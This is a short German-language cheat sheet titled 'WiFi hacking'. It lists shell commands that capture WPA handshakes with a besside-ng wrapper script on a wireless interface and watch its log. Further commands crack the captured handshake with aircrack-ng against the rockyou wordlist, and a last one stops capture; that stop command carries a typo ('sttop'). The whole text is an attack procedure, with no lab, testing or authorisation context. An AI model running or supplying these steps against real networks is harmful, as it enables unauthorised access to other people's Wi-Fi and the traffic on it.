WiFi hacking 🛜

WPA-Handshakes aufzeichnen:
sudo ./besside-ng-wrapper.sh -i wlan0 start
tail -f besside.log

Versuchen das WLAN-Passwort zu erraten:
./lsvendors.pl <besside.log
aircrack-ng -w /usr/share/wordlists/rockyou.txt ./wpa.cap

Beenden:
sudo ./besside-ng-wrapper.sh -i wlan0mon sttop

